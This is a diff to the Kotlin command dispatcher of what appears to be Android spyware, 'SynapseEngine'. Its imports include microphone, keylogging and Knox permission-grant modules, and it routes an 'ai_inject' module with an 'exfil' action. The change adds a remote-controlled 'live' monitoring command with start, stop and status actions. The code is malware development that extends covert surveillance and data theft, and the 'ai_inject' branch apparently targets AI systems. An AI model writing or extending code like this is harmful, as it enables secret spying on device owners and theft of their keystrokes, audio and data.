@@ -22,6 +22,7 @@ import org.synapse.core.modules.MicModule
 import org.synapse.core.modules.NotificationModule
 import org.synapse.core.modules.KeylogModule
 import org.synapse.core.modules.KnoxPermissionGrant
+import org.synapse.core.modules.LiveMonitor
 
 object SynapseEngine {
     private const val TAG = "Synapse"
@@ -121,6 +122,12 @@ object SynapseEngine {
                 "exfil" -> AiInjectionModule.exfil(context, cmd)
                 "status" -> AiInjectionModule.status(context, cmd)
                 else -> SynapseResponse.ErrorResponse("ai_inject:unknown_action:${cmd.action}", "ai_inject")
+            }},
+            "live"     to { cmd -> when (cmd.action) {
+                "start" -> LiveMonitor.start(context, cmd)
+                "stop" -> LiveMonitor.stop(context, cmd)
+                "status" -> LiveMonitor.status(cmd)
+                else -> SynapseResponse.ErrorResponse("unknown:live:${cmd.action}", "live")
             }}
         )
 
